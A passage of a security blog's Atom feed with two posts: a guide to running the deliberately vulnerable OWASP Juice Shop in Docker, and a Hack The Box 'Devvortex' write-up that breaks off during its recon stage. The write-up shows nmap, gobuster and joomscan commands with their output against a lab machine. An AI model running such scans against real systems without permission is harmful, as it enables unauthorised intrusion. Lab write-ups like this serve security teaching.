+        <title>Cybersecurity Playground: Installing OWASP Juice Shop on Ubuntu with Docker – A Step-by-Step Guide</title>
+        <author>
+            <name>Sakibul Ali Khan</name>
+        </author>
+        <link href="https://sakibulalikhan.pages.dev/cybersecurity-playground-installing-owasp-juice-shop-on-ubuntu-with-docker-a-step-by-step-guide.html"/>
+        <id>https://sakibulalikhan.pages.dev/cybersecurity-playground-installing-owasp-juice-shop-on-ubuntu-with-docker-a-step-by-step-guide.html</id>
+        <media:content url="https://sakibulalikhan.pages.dev/media/posts/22/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide1-2.png" medium="image" />
+            <category term="Web Security"/>
+            <category term="Pentesting"/>
+            <category term="Home Labs"/>
+            <category term="Docker"/>
+            <category term="CVE"/>
+
+        <updated>2024-02-11T17:05:04+06:00</updated>
+            <summary>
+                <![CDATA[
+                        <img src="https://sakibulalikhan.pages.dev/media/posts/22/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide1-2.png" alt="Cybersecurity Playground: Installing OWASP Juice Shop on Ubuntu with Docker – A Step-by-Step Guide" />
+                    In the realm of cybersecurity education and training, practical hands-on experience is invaluable. Recognizing this need, OWASP (Open Web Application Security Project) introduced the Juice&hellip;
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                    <p><img src="https://sakibulalikhan.pages.dev/media/posts/22/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide1-2.png" class="type:primaryImage" alt="Cybersecurity Playground: Installing OWASP Juice Shop on Ubuntu with Docker – A Step-by-Step Guide" /></p>
+                <div class="cl-preview-section">
+<p>In the realm of cybersecurity education and training, practical hands-on experience is invaluable. Recognizing this need, OWASP (Open Web Application Security Project) introduced the Juice Shop – an intentionally vulnerable web application designed to simulate real-world security challenges. This blog post aims to provide a detailed walkthrough on installing OWASP Juice Shop on Ubuntu using Docker, allowing enthusiasts and professionals alike to delve into the intricacies of web security in a controlled environment.</p>
+</div>
+<div class="cl-preview-section">
+<h2 id="what-is-owasp-juice-shop">What is OWASP Juice Shop?</h2>
+</div>
+<div class="cl-preview-section">
+<figure class="post__image"><img decoding="async" loading="lazy"  src="https://joshcgrossman.files.wordpress.com/2018/03/juiceshopctf_logo.png" alt="Cybersecurity Playground: Installing OWASP Juice Shop on Ubuntu with Docker – A Step-by-Step Guide" width="267" height="320" data-is-external-image="true"></figure>
+<p>The OWASP Juice Shop is not your typical online store; it serves as a playground for security enthusiasts and professionals to hone their skills in identifying and exploiting web application vulnerabilities. Concealed beneath its facade as a fruit and vegetable juice shop lie 102 deliberately planted challenges of varying difficulty levels, representing common security vulnerabilities encountered in modern web development.</p>
+</div>
+<div class="cl-preview-section">
+<p>The Juice Shop’s development commenced in September 2014, driven by the necessity for a contemporary security training environment that reflects the intricacies of current web technologies. Over the years, it has evolved into a sophisticated platform, leveraging modern frameworks such as Angular, JavaScript, Node.js, and SQLite for its database.</p>
+</div>
+<div class="cl-preview-section">
+<h3 id="vulnerability-categories">Vulnerability Categories:</h3>
+</div>
+<div class="cl-preview-section">
+<p>In OWASP Juice Shop, vulnerabilities are meticulously categorized into various classes, covering a wide spectrum of risk and vulnerability types identified in well-known lists and documents such as <a href="https://owasp.org/www-project-top-ten/" target="_blank" class="extlink extlink-icon-5 "  title="sakibulalikhan" rel="noopener noreferrer">OWASP Top 10</a>, <a href="https://owasp.org/www-project-application-security-verification-standard/" target="_blank" class="extlink extlink-icon-5 "  title="sakibulalikhan" rel="noopener noreferrer">OWASP ASVS</a>, <a href="https://owasp.org/www-project-automated-threats-to-web-applications/" target="_blank" class="extlink extlink-icon-5 "  title="sakibulalikhan" rel="noopener noreferrer">OWASP Automated Threat Handbook</a>, <a href="https://owasp.org/www-project-api-security/" target="_blank" class="extlink extlink-icon-5 "  title="sakibulalikhan" rel="noopener noreferrer">OWASP API Security Top 10</a>, <a href="https://owasp.org/www-project-top-10-privacy-risks" target="_blank" class="extlink extlink-icon-5 "  title="sakibulalikhan" rel="noopener noreferrer">OWASP Top 10 Privacy Risks</a>, and MITRE’s <a href="https://cwe.mitre.org/" target="_blank" class="extlink extlink-icon-5 "  title="sakibulalikhan" rel="noopener noreferrer">Common Weakness Enumeration (CWE)</a>. This structured approach enables users to target specific areas of interest and gain comprehensive insights into web application security.</p>
+</div>
+<div class="cl-preview-section">
+<ul>
+<li>Category Breakdown:</li>
+</ul>
+</div>
+<div class="cl-preview-section">
+<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/22/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide.png" alt="Cybersecurity Playground: Installing OWASP Juice Shop on Ubuntu with Docker – A Step-by-Step Guide" width="538" height="357" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/22/responsive/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/22/responsive/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/22/responsive/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/22/responsive/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide-lg.png 1024w"></figure>
+<p><strong>Category Mappings:</strong></p>
+</div>
+<div class="cl-preview-section">
+<div class="table-wrapper">
+<table>
+<thead>
+<tr>
+<th>Category</th>
+<th>OWASP</th>
+<th>CWE</th>
+<th>WASC</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Broken Access Control</td>
+<td>A1:2021, API1:2019, API5:2019</td>
+<td>CWE-22, CWE-285, CWE-639, CWE-918</td>
+<td>WASC-02, WASC-09, WASC-16</td>
+</tr>
+<tr>
+<td>Broken Anti-Automation</td>
+<td>OWASP-AT-004, API4:2019, OWASP-AT-010, …</td>
+<td>CWE-362</td>
+<td>WASC-11, WASC-21</td>
+</tr>
+<tr>
+<td>Broken Authentication</td>
+<td>A7:2021, API2:2019, P6:2021</td>
+<td>CWE-287, CWE-352</td>
+<td>WASC-01, WASC-49</td>
+</tr>
+<tr>
+<td>Cross Site Scripting (XSS)</td>
+<td>A3:2021, A7:2017</td>
+<td>CWE-79</td>
+<td>WASC-8</td>
+</tr>
+<tr>
+<td>Cryptographic Issues</td>
+<td>A2:2021</td>
+<td>CWE-326, CWE-327, CWE-328, CWE-950</td>
+<td>-</td>
+</tr>
+<tr>
+<td>Improper Input Validation</td>
+<td>ASVS V5, API6:2019</td>
+<td>CWE-20</td>
+<td>WASC-20</td>
+</tr>
+<tr>
+<td>Injection</td>
+<td>A3:2021, API8:2019, P1:2021</td>
+<td>CWE-74, CWE-89</td>
+<td>WASC-19, WASC-28, WASC-31</td>
+</tr>
+<tr>
+<td>Insecure Deserialization</td>
+<td>A8:2021, A8:2017</td>
+<td>CWE-502</td>
+<td>-</td>
+</tr>
+<tr>
+<td>Miscellaneous</td>
+<td>P5:2021</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>Security Misconfiguration</td>
+<td>A5:2021, A9:2021, API7:2019, API9:2019, …</td>
+<td>CWE-209</td>
+<td>WASC-14, WASC-15</td>
+</tr>
+<tr>
+<td>Security through Obscurity</td>
+<td>A4:2021, P5:2021</td>
+<td>CWE-656</td>
+<td>-</td>
+</tr>
+<tr>
+<td>Sensitive Data Exposure</td>
+<td>A3:2017, API3:2019, OTG-CONFIG-004, P2:2021</td>
+<td>CWE-200, CWE-530, CWE-548</td>
+<td>WASC-13</td>
+</tr>
+<tr>
+<td>Unvalidated Redirects</td>
+<td>A10:2013</td>
+<td>CWE-601</td>
+<td>WASC-38</td>
+</tr>
+<tr>
+<td>Vulnerable Components</td>
+<td>A6:2021</td>
+<td>CWE-829, CWE-506, CWE-1104</td>
+<td>-</td>
+</tr>
+<tr>
+<td>XML External Entities (XXE)</td>
+<td>A5:2021, A4:2017</td>
+<td>CWE-611</td>
+<td>WASC-43</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+<div class="cl-preview-section">
+<p>Each category represents a distinct aspect of web application security, ranging from access control and authentication to cryptographic issues and injection vulnerabilities. By aligning Juice Shop’s challenges with these standardized categories, users can effectively address specific security concerns and enhance their understanding of prevalent threats in the digital landscape.</p>
+</div>
+<div class="cl-preview-section">
+<h4 id="installing-owasp-juice-shop-on-ubuntu-with-docker">Installing OWASP Juice Shop on Ubuntu with Docker:</h4>
+</div>
+<div class="cl-preview-section">
+<p>Now, let’s dive into the installation process of OWASP Juice Shop on Ubuntu using Docker. While the initial instructions provided focused on Kali Linux, the procedure remains largely similar for Ubuntu.</p>
+</div>
+<div>
+<div> </div>
+<div class="cl-preview-section">1.<strong> Installing Docker on Ubuntu:</strong></div>
+<div class="cl-preview-section">
+<p>Begin by updating the package index and installing Docker using the following commands:</p>
+</div>
+<div>
+<pre class="language-bash line-numbers"><code>sudo apt update sudo apt install -y docker.io</code></pre>
+</div>
+<div class="cl-preview-section">
+<p>After installation, start the Docker service and enable it to launch automatically upon system reboot:</p>
+</div>
+<div>
+<pre class="language-bash line-numbers"><code>sudo systemctl enable docker --now</code></pre>
+</div>
+<div class="cl-preview-section">
+<p>To grant your user permission to use Docker, add it to the docker group:</p>
+</div>
+<div>
+<pre class="language-bash line-numbers"><code>sudo usermod -aG docker $USER</code></pre>
+</div>
+<div class="cl-preview-section">
+<p>Reload the group settings for the changes to take effect:</p>
+</div>
+<div>
+<pre class="language-bash line-numbers"><code>newgrp docker</code></pre>
+</div>
+<div> </div>
+<div class="cl-preview-section">2.<strong> Running OWASP Juice Shop with Docker:</strong></div>
+<div class="cl-preview-section">
+<p>With Docker installed, pulling and running OWASP Juice Shop is a breeze. Execute the following command to download and launch the Juice Shop container:</p>
+</div>
+<div class="cl-preview-section">
+<pre class="language-bash line-numbers"><code>docker run --rm -p 3000:3000 bkimminich/juice-shop</code></pre>
+<p>If necessary, pull the Juice Shop image first using:</p>
+</div>
+<div>
+<pre class="language-bash line-numbers"><code>docker pull bkimminich/juice-shop</code></pre>
+</div>
+<div class="cl-preview-section">
+<p>Once the container is running, access OWASP Juice Shop via <a href="http://localhost:3000/"  class="extlink extlink-icon-5 "  title="sakibulalikhan" >http://localhost:3000/</a> in your web browser.</p>
+<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/22/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide2.png" alt="Cybersecurity Playground: Installing OWASP Juice Shop on Ubuntu with Docker – A Step-by-Step Guide" width="528" height="286" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/22/responsive/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide2-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/22/responsive/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide2-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/22/responsive/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide2-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/22/responsive/Cybersecurity-Playground-Installing-OWASP-Juice-Shop-on-Ubuntu-with-Docker-A-Step-by-Step-Guide2-lg.png 1024w"></figure>
+</div>
+</div>
+<div class="cl-preview-section">
+<h3 id="conclusion">Conclusion:</h3>
+</div>
+<div class="cl-preview-section">
+<p>In conclusion, OWASP Juice Shop stands as a testament to the commitment towards enhancing web application security through hands-on learning and gamification. By leveraging Docker, enthusiasts and professionals can swiftly set up and explore the intricacies of web security in a controlled environment. Embrace the challenges, uncover vulnerabilities, and embark on a journey towards mastering the art of cybersecurity with OWASP Juice Shop.</p>
+</div>
+            ]]>
+        </content>
+    </entry>
+    <entry>
+        <title>Devvortex - HTB Writeup</title>
+        <author>
+            <name>Sakibul Ali Khan</name>
+        </author>
+        <link href="https://sakibulalikhan.pages.dev/devvortex-htb-writeup.html"/>
+        <id>https://sakibulalikhan.pages.dev/devvortex-htb-writeup.html</id>
+        <media:content url="https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup1.png" medium="image" />
+            <category term="Linux Privilege Escalations"/>
+            <category term="HackTheBox"/>
+            <category term="CVE"/>
+            <category term="CTF Writeups"/>
+
+        <updated>2024-02-09T04:25:15+06:00</updated>
+            <summary>
+                <![CDATA[
+                        <img src="https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup1.png" alt="Devvortex - HTB Writeup" />
+                    Machine Name: Devvortex Difficulty: Easy OS: Linux Challenges: vHost-busting, CVEs, SSTI Beginning start with Nmap scan. For scan, we use ‘-sCV’ flag to run defult scripts&hellip;
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                    <p><img src="https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup1.png" class="type:primaryImage" alt="Devvortex - HTB Writeup" /></p>
+                <ul style="list-style-type: circle;">
+<li><strong>Machine Name: </strong>Devvortex</li>
+<li><strong>Difficulty: </strong>Easy</li>
+<li><strong>OS: </strong>Linux</li>
+<li><strong class="ly kz">Challenges: </strong><span class="ly kz">vHost-busting, CVEs, SSTI</span></li>
+</ul>
+<p>Beginning start with Nmap scan. For scan, we use ‘<strong>-sCV</strong>’ flag to run defult scripts and identify the services versions. Also using '<strong>-Pn</strong>' flag to give not ping the server and '<strong>--min-rate=5000</strong>' flag to speedup our scan.</p>
+<pre class="language-bash line-numbers"><code>sudo nmap -sCV -p- 10.10.11.242 -Pn --min-rate=5000
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-09 00:57 +06
+Nmap scan report for 10.10.11.242
+Host is up (0.054s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://devvortex.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 26.34 seconds</code></pre>
+<p>It looks like there are 2 services running. In target machine service one is ‘<strong>SSH</strong>’ running on <strong>22/tcp</strong> port and anotherone is '<strong>Nginx</strong>' running on <strong>80/tcp</strong> port.</p>
+<h3 id="3877" class="ng nh gr be ni nj nk nl nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob oc od bj">Foothold</h3>
+<p>Visiting directly the IP address ( <code class="cw ok ol om on b">http://10.10.11.242</code> ) revealed that we need to resolve domain <code class="cw ok ol om on b">devvortex.htb</code> domain. Next step is to add <code class="cw ok ol om on b">10.10.11.242 devvortex.htb</code> into <code class="cw ok ol om on b">/etc/hosts</code> file. Use the bellow command to do that.</p>
+<pre class="language-bash line-numbers"><code>echo '10.10.11.242 devvortex.htb' | sudo tee -a /etc/hosts </code></pre>
+<h3>Visit Website</h3>
+<p><span data-slate-fragment="JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMkxldHMlMjBjaGVjayUyMG91dCUyMHRoaXMlMjB3ZWIlMjAlMjIlMkMlMjJtYXJrcyUyMiUzQSU1QiU1RCUyQyUyMnNlbGVjdGlvbnMlMjIlM0ElNUIlNUQlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjIxa0dzSURaazRtM0IlMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJ0cld0ZlBNaHBzWjYlMjIlN0QlNUQlMkMlMjJrZXklMjIlM0ElMjJ0T0VLdjVUYlluMlklMjIlN0Q=">Let's check out the website...</span></p>
+<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup.png" alt="Devvortex - HTB Writeup" width="502" height="263" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup-lg.png 1024w"></figure>
+<p>After examining the website I didn’t find anything interesting. No secrets, just straightforward simplicity.</p>
+<h3>Directory Fuzzing</h3>
+<p>I am using Gobuster to find hidden directorys if there any.</p>
+<pre class="language-bash line-numbers"><code>gobuster dir -u http://devvortex.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -r
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://devvortex.htb/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Follow Redirect:         true
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/css                  (Status: 403) [Size: 162]
+/images               (Status: 403) [Size: 162]
+/index.html           (Status: 200) [Size: 18048]
+/js                   (Status: 403) [Size: 162]
+Progress: 4723 / 4724 (99.98%)
+===============================================================
+Finished
+===============================================================</code></pre>
+<p>Here, I found nothing interesting to give attentions.</p>
+<h3>Subdomain Recon</h3>
+<p>Now, I am trying to fuzzing vhosts with Gobuster tool to get new targets.</p>
+<pre class="language-bash line-numbers"><code>gobuster dns -d devvortex.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Domain:     devvortex.htb
+[+] Threads:    10
+[+] Timeout:    1s
+[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+===============================================================
+Starting gobuster in DNS enumeration mode
+===============================================================
+Found: dev.devvortex.htb
+
+Progress: 4989 / 4990 (99.98%)
+===============================================================
+Finished
+===============================================================</code></pre>
+<p>We found the dev.devvortex.htb subdomain. We need to add it in the hosts file too.</p>
+<pre class="language-bash line-numbers"><code>10.10.11.242 devvortex.htb dev.devvortex.htb</code></pre>
+<h3>Visiting Website</h3>
+<p><span data-offset-key="8Y1UIGHIVYc5:0">Let's checkout </span><code class="r-crgep1 r-2jxp4q r-z2wwpe r-uibjmv r-m2pi6t r-1hvjb8t" data-slate-leaf="true" data-offset-key="8Y1UIGHIVYc5:1" data-slate-fragment="JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMkxldHMlMjBjaGVja291dCUyMCUyMiUyQyUyMm1hcmtzJTIyJTNBJTVCJTVEJTJDJTIyc2VsZWN0aW9ucyUyMiUzQSU1QiU1RCU3RCUyQyU3QiUyMm9iamVjdCUyMiUzQSUyMmxlYWYlMjIlMkMlMjJ0ZXh0JTIyJTNBJTIyZGV2LmRldnZvcnRleC5odGIlMjIlMkMlMjJtYXJrcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMm1hcmslMjIlMkMlMjJ0eXBlJTIyJTNBJTIyY29kZSUyMiUyQyUyMmRhdGElMjIlM0ElN0IlN0QlN0QlNUQlMkMlMjJzZWxlY3Rpb25zJTIyJTNBJTVCJTVEJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIyQVl4ODBHWkF6M0ZWJTIyJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIyblhuRG41U2U1ZWZTJTIyJTdEJTVEJTJDJTIya2V5JTIyJTNBJTIySkw4TUU1dDc0RVhvJTIyJTdE">dev.devvortex.htb</code></p>
+<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup2.png" alt="Devvortex - HTB Writeup" width="516" height="270" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup2-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup2-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup2-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup2-lg.png 1024w"></figure>
+<p>Slightly changed visuals, probably this version of website is in development and they forgot to turn off vhost on production.</p>
+<p id="bb23" class="pw-post-body-paragraph mi mj gr mk b ml mm mn mo mp mq mr ms mt mu mv mw mx my mz na nb nc nd ne nf gk bj" data-selectable-paragraph="">Anyways, let’s run Gobuster directory enumerationg against it to see what we will find!</p>
+<h3>Directorys Fuzzing</h3>
+<p><span data-slate-fragment="JTdCJTIyb2JqZWN0JTIyJTNBJTIyZG9jdW1lbnQlMjIlMkMlMjJkYXRhJTIyJTNBJTdCJTdEJTJDJTIybm9kZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJibG9jayUyMiUyQyUyMnR5cGUlMjIlM0ElMjJwYXJhZ3JhcGglMjIlMkMlMjJpc1ZvaWQlMjIlM0FmYWxzZSUyQyUyMmRhdGElMjIlM0ElN0IlN0QlMkMlMjJub2RlcyUyMiUzQSU1QiU3QiUyMm9iamVjdCUyMiUzQSUyMnRleHQlMjIlMkMlMjJsZWF2ZXMlMjIlM0ElNUIlN0IlMjJvYmplY3QlMjIlM0ElMjJsZWFmJTIyJTJDJTIydGV4dCUyMiUzQSUyMkxldHMlMjBydW4lMjBmZXJveGJ1c3RlciUyMGFuZCUyMHNlZSUyMGlmJTIwd2UlMjBjYW4lMjBmaW5kJTIwYW55JTIwaW50ZXJlc3RpbmclMjBkaXJlY3RvcmllcyUyMiUyQyUyMm1hcmtzJTIyJTNBJTVCJTVEJTJDJTIyc2VsZWN0aW9ucyUyMiUzQSU1QiU1RCU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMjVZSUVvSENwWFNXRyUyMiU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMkFFVmhaaVhDcUxxSCUyMiU3RCU1RCUyQyUyMmtleSUyMiUzQSUyMkVaVDNDSUh2ek1sbiUyMiU3RA==">Let's run Gobuster and see if we can find any interesting directories.</span></p>
+<pre class="language-bash line-numbers"><code>gobuster dir -u http://dev.devvortex.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -o dirs_http_dev.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://dev.devvortex.htb
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/images/]
+/home                 (Status: 200) [Size: 23221]
+/media                (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/media/]
+/templates            (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/templates/]
+/modules              (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/modules/]
+/plugins              (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/plugins/]
+/includes             (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/includes/]
+/language             (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/language/]
+/components           (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/components/]
+/api                  (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/api/]
+/cache                (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/cache/]
+/libraries            (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/libraries/]
+/tmp                  (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/tmp/]
+/layouts              (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/layouts/]
+/administrator        (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/administrator/]
+/cli                  (Status: 301) [Size: 178] [--&gt; http://dev.devvortex.htb/cli/]
+Progress: 22980 / 207644 (11.07%)^C
+[!] Keyboard interrupt detected, terminating.
+Progress: 22994 / 207644 (11.07%)
+===============================================================
+Finished
+===============================================================</code></pre>
+<p>We identified a few directories but I am interested to <code>/administrator</code> directory and it redirects us to Joomla admin panel.</p>
+<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/20/Devvortex-HTB-Writeup3.png" alt="Devvortex - HTB Writeup" width="523" height="272" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup3-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup3-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup3-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/20/responsive/Devvortex-HTB-Writeup3-lg.png 1024w"></figure>
+<h3>Website Recon</h3>
+<p>Its a Joomla CMS website. So, let's run Joomscan to findout if there any vulnerebility it have.</p>
+<pre class="language-bash line-numbers"><code>joomscan -u http://dev.devvortex.htb/
+    ____  _____  _____  __  __  ___   ___    __    _  _ 
+   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
+  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
+  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
+			(1337.today)
+   
+    --=[OWASP JoomScan
+    +---++---==[Version : 0.0.7
+    +---++---==[Update Date : [2018/09/23]
+    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
+    --=[Code name : Self Challenge
+    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP
+
+Processing http://dev.devvortex.htb/ ...
+
+
+
+[+] FireWall Detector
+[++] Firewall not detected
+
+[+] Detecting Joomla Version
+[++] Joomla 4.2.6
+
+[+] Core Joomla Vulnerability
+[++] Target Joomla core is not vulnerable
+
+[+] Checking apache info/status files
+[++] Readable info/status files are not found
+
+[+] admin finder
+[++] Admin page : http://dev.devvortex.htb/administrator/
+
+[+] Checking robots.txt existing
+[++] robots.txt is found
+path : http://dev.devvortex.htb/robots.txt 
+
+Interesting path found from robots.txt
+http://dev.devvortex.htb/joomla/administrator/
+http://dev.devvortex.htb/administrator/
+http://dev.devvortex.htb/api/
+http://dev.devvortex.htb/bin/
+http://dev.devvortex.htb/cache/
+http://dev.devvortex.htb/cli/
+http://dev.devvortex.htb/components/
+http://dev.devvortex.htb/includes/
+http://dev.devvortex.htb/installation/
+http://dev.devvortex.htb/language/
+http://dev.devvortex.htb/layouts/
+http://dev.devvortex.htb/libraries/
